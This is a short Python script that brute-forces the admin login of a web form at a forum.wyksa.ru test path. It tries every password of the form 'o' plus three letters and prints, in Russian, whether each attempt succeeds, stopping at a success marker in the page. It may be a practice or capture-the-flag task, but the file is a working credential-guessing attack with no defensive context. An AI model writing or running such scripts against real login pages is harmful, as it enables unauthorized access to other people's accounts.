import requests
from itertools import *

login_url='https://forum.wyksa.ru/test/'
passwords = ["o"+"".join(x) for x in product("difghjklzxcvbnmqwertyupas", repeat=3)]

payload = {
    'name':'admin',
    'pass':''
}

for password in passwords:
    payload['pass']=password
    response = requests.post(login_url, data=payload, headers={'User-Agent': 'Custom Agent'})
    if "Look!" in response.text:
        print(f"Авторизация с паролем {password} прошла успешно, code {response.status_code}")
        break
    else:
        print(f"Авторизация с паролем {password} не прошла, code {response.status_code}")
